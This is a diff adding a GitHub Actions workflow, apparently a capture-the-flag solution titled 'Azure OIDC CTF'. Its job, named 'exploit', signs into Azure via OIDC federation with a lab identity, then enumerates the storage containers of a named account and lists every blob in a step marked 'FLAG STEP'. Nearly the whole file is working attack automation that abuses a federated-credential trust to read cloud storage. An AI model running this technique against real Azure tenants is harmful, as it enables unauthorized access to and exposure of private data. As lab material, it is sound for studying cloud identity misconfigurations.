@@ -1,0 +1,43 @@
+name: Azure OIDC CTF
+
+on:
+  push:
+    branches:
+      - main
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Azure Login via OIDC
+      uses: azure/login@v1
+      with:
+        client-id: iam-azure-lab-3-identity
+        tenant-id: fdd066e1-ee37-49bc-b08f-d0e152119b04
+        subscription-id: dcc6c69d-9c95-4b19-a54f-534937316c51
+
+    - name: Enumerate storage containers
+      run: |
+        az storage container list \
+          --account-name iamazurelab30741635f \
+          --auth-mode login \
+          -o table
+
+    - name: Dump blobs (FLAG STEP)
+      run: |
+        for c in $(az storage container list \
+          --account-name iamazurelab30741635f \
+          --auth-mode login \
+          --query "[].name" -o tsv); do
+          echo "=== Container: $c ==="
+          az storage blob list \
+            --account-name iamazurelab30741635f \
+            --container-name $c \
+            --auth-mode login \
+            -o table
+        done
